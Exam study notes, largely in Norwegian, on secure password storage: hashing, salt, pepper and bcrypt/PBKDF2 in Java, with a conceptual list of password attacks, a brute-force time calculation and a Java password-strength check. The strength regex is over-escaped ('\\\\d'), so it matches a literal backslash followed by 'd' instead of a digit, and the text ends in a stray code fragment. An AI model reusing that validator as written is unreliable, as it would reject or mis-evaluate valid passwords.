<h2>Lagringsmåter (fra verst til best)</h2>
<div class="table-wrap"><table>
<tr><th>Metode</th><th>Problem hvis databasen lekker</th></tr>
<tr><td>Klartekst</td><td>Alle passord eksponert umiddelbart. (Får du passordet ditt tilsendt på e-post, er det lagret i klartekst eller toveis-kryptert!)</td></tr>
<tr><td>Kryptert (toveis)</td><td>Nøkkelen må lagres et sted – lekker den, er alt åpent. Admin/innsider kan dekryptere.</td></tr>
<tr><td>Hash (MD5/SHA-1/SHA-256)</td><td>Like passord → like hasher. Raske → milliarder gjetninger/sek på GPU. Rainbow tables.</td></tr>
<tr><td>Hash + salt</td><td>Rainbow tables ubrukelige, like passord får ulike hasher – men fortsatt rask brute force.</td></tr>
<tr><td><b>Slow hash + salt (+ pepper)</b></td><td><b>Best</b>: bcrypt, scrypt, PBKDF2, Argon2 med work factor.</td></tr>
</table></div>

<h2>De fire egenskapene (kommer HVERT år: v24, h23, h24, h25, v26)</h2>
<div class="exam-answer">
<p><b>1. Cryptographically secure hash:</b> a one-way function, so the password is only <b>verifiable, not recoverable</b>. The server stores only the hash and compares hashes at login; even the admin or an attacker with the database cannot reverse it to the plaintext. It is also collision- and preimage-resistant.</p>
<p><b>2. Slow hash algorithm</b> (bcrypt, scrypt, PBKDF2, Argon2): introduces a configurable <b>work factor</b> (iterations/memory), so each hash takes e.g. 100 ms instead of nanoseconds. This barely affects a legitimate login but slows an attacker's brute-force and dictionary attacks by many orders of magnitude, increasing the time needed to crack a password.</p>
<p><b>3. Unique per-user salt:</b> a random value combined with each password before hashing and stored with the hash. Two users with the same password get <b>different hashes</b>, so cracking one does not reveal the other, and <b>precomputed rainbow tables become useless</b> (the attacker would need a table per salt). The attacker must attack each hash individually.</p>
<p><b>4. Pepper:</b> a secret value added to all passwords that is <b>not stored in the database</b> (stored in config/HSM). If only the database is stolen (e.g. via SQL injection), the attacker lacks the pepper and cannot run offline dictionary/rainbow/brute-force attacks at all.</p>
</div>

~~~java
// Spring Security
PasswordEncoder encoder = new BCryptPasswordEncoder(12);   // work factor 12
String hash = encoder.encode(password);                    // salt generated and stored inside the hash
boolean ok = encoder.matches(loginPassword, hash);

// PBKDF2 manually
SecureRandom rnd = new SecureRandom();
byte[] salt = new byte[16];
rnd.nextBytes(salt);
PBEKeySpec spec = new PBEKeySpec((password + PEPPER).toCharArray(), salt, 310000, 256);
byte[] hash = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256")
                              .generateSecret(spec).getEncoded();
// store salt + hash (+ iterations) for the user
~~~

<h2>Angrep mot passord</h2>
<ul>
<li><b>Brute force</b> – prøver alle mulige kombinasjoner i søkerommet.</li>
<li><b>Dictionary attack</b> – prøver ordlister med vanlige ord, lekkede passord (rockyou.txt) og varianter.</li>
<li><b>Rainbow table</b> – slår opp hashen i en forhåndsberegnet tabell (hash → passord). Stoppes av salt.</li>
<li><b>Credential stuffing</b> – bruker brukernavn/passord lekket fra andre tjenester (gjenbruk).</li>
<li><b>Password spraying</b> – noen få vanlige passord mot mange kontoer (unngår lockout).</li>
<li>Phishing, keylogging, shoulder surfing, social engineering.</li>
<li><b>Online</b> (mot innloggingsskjemaet – stoppes av rate limiting/lockout) vs. <b>offline</b> (mot stjålne hasher – stoppes av slow hash/salt/pepper).</li>
</ul>

<h2>Regnestykke (h21 MC)</h2>
<p>11 tegn fra a–z, A–Z, 0–9 → 62 tegn. Søkerom = 62<sup>11</sup> ≈ 5,2·10<sup>19</sup>. Hardware: 40 kjerner × 10<sup>10</sup>/s = 4·10<sup>11</sup>/s. Tid = 5,2·10<sup>19</sup> / 4·10<sup>11</sup> ≈ 1,3·10<sup>8</sup> s ≈ 1500 dager ≈ <b>4 år</b>. Lengde øker søkerommet eksponentielt.</p>

<h2>Håndheve sterke passord ved registrering</h2>
<ul>
<li>Minimum lengde (≥ 8, helst 12+), tillat lange (≥ 64) og alle tegn inkl. mellomrom.</li>
<li>Sjekk mot liste over lekkede/vanlige passord (Have I Been Pwned) og mot brukernavn/e-post.</li>
<li>Kompleksitetskrav (store/små bokstaver, tall, spesialtegn) – kurset forventer ofte dette; NIST anbefaler heller lengde + blocklist.</li>
<li>Styrkemåler (zxcvbn), rate limiting, MFA, ikke tvungen periodisk bytte.</li>
<li>Valider <b>på serveren</b> (klientvalidering kan omgås).</li>
</ul>
~~~java
private static final Pattern STRONG = Pattern.compile(
    "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\\\d)(?=.*[^A-Za-z0-9]).{12,128}$");

public boolean isStrong(String password, String username) {
    if (password == null || !STRONG.matcher(password).matches()) return false;
    if (password.toLowerCase().contains(username.toLowerCase())) return false;
    if (commonPasswords.contains(password.toLowerCase())) return false;   // blocklist
    return true;
}
~~~
`
});
